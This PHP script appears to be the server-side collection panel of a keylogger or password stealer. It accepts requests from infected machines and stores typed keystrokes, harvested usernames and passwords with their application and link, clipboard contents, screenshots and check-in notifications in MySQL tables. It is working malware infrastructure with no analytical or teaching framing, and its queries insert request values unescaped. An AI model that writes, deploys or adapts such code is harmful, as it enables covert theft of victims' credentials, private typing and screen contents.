<?php
ob_start();
include ('config.php');
$conn = new mysqli($mysql_host, $mysql_user, $mysql_password, $mysql_database);
if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}
$machinename = $_REQUEST['machinename'];
$windowtitle = $_REQUEST['windowtitle'];
$keystrokestyped = $_REQUEST['keystrokestyped'];
$machinetime = $_REQUEST['machinetime'];
$ipaddress = $_SERVER['REMOTE_ADDR'];
$date = date('Y-m-d H:i:s');
$application = $_REQUEST['application'];
$username = htmlentities($_REQUEST['username']);
$password = htmlentities($_REQUEST['password']);
$imagetype = htmlentities($_REQUEST['imagetype']);
$clipboardtext = htmlentities($_REQUEST['clipboardtext']);
$link = htmlentities($_REQUEST['link']);

if ($_GET['type'] == 'keystrokes')
{
$sqlk = "CREATE TABLE if not exists Keystrokes (id INT(6) UNSIGNED AUTO_INCREMENT PRIMARY KEY, machinename VARCHAR(255) NOT NULL, windowtitle VARCHAR(255) NOT NULL,
keystrokestyped VARCHAR(255), machinetime VARCHAR(255) NOT NULL, ipaddress VARCHAR(255) NOT NULL, date TIMESTAMP)";

if ($conn->query($sqlk) === TRUE) {
    $sqlinsertk ="INSERT INTO Keystrokes (id, machinename, windowtitle, keystrokestyped, machinetime, ipaddress, date) VALUES (NULL, '$machinename', '$windowtitle', '$keystrokestyped', '$machinetime', '$ipaddress', '$date')"; 

    if ($conn->query($sqlinsertk) === TRUE) {
       echo "<br>Success";
}else{
echo "<br>Error:" . $conn->error;
} } else {
    echo "<br>Error:" . $conn->error;
}
}

if ($_GET['type'] == 'passwords')
{
$sqlp = "CREATE TABLE if not exists Passwords (id INT(6) UNSIGNED AUTO_INCREMENT PRIMARY KEY, machinename VARCHAR(255) NOT NULL, application VARCHAR(255) NOT NULL,  link VARCHAR(255) NOT NULL,
username VARCHAR(255), password VARCHAR(255) NOT NULL, ipaddress VARCHAR(255) NOT NULL, date TIMESTAMP)";

if ($conn->query($sqlp) === TRUE) {
$sqlinsertp ="INSERT INTO Passwords (id, machinename, application, link, username, password, ipaddress, date) VALUES (NULL, '$machinename', '$application', '$link', '$username', '$password', '$ipaddress', '$date')"; 

    if ($conn->query($sqlinsertp) === TRUE) {
       echo "<br>Success";
}else{
echo "<br>Error:" . $conn->error;
} } else {
    echo "<br>Error:" . $conn->error;
}
}

if ($_GET['type'] == 'notification')
{
$sqln = "CREATE TABLE if not exists Notifications (id INT(6) UNSIGNED AUTO_INCREMENT PRIMARY KEY, machinename VARCHAR(255) NOT NULL, machinetime VARCHAR(255), ipaddress VARCHAR(255) NOT NULL, date TIMESTAMP)";

if ($conn->query($sqln) === TRUE) {
$sqlinsertn ="INSERT INTO Notifications (id, machinename, machinetime, ipaddress, date) VALUES (NULL, '$machinename', '$machinetime', '$ipaddress', '$date')"; 

if ($conn->query($sqlinsertn) === TRUE) {
       echo "<br>Success";
}else{
echo "<br>Error:" . $conn->error;
} } else {
    echo "<br>Error:" . $conn->error;
}
}

if ($_GET['type'] == 'clipboard')
{
$sqlc = "CREATE TABLE if not exists Clipboard (id INT(6) UNSIGNED AUTO_INCREMENT PRIMARY KEY, machinename VARCHAR(255) NOT NULL, windowtitle VARCHAR(255) NOT NULL, 
clipboardtext VARCHAR(255) NOT NULL, machinetime VARCHAR(255) NOT NULL, ipaddress VARCHAR(255) NOT NULL, date TIMESTAMP)";

if ($conn->query($sqlc) === TRUE) {
$sqlinsertp ="INSERT INTO Clipboard (id, machinename, windowtitle, clipboardtext, machinetime, ipaddress, date) VALUES (NULL, '$machinename', '$windowtitle', '$clipboardtext', '$machinetime', '$ipaddress', '$date')"; 

    if ($conn->query($sqlinsertp) === TRUE) {
       echo "<br>Success";
}else{
echo "<br>Error:" . $conn->error;
} } else {
    echo "<br>Error:" . $conn->error;
}
}

if ($_GET['type'] == 'screenshots')
{
$sqls = "CREATE TABLE if not exists Screenshots(id INT(6) UNSIGNED AUTO_INCREMENT PRIMARY KEY, machinename VARCHAR(255) NOT NULL, image LONGBLOB, imagetype VARCHAR(255) NOT NULL, ipaddress VARCHAR(255) NOT NULL, date TIMESTAMP)";

if ($conn->query($sqls) === TRUE) {
    echo "<br>Table Screenshots is ready";
} else {
    echo "<br>Error creating Clipboard table:" . $conn->error;
}
}
$conn->close();
?>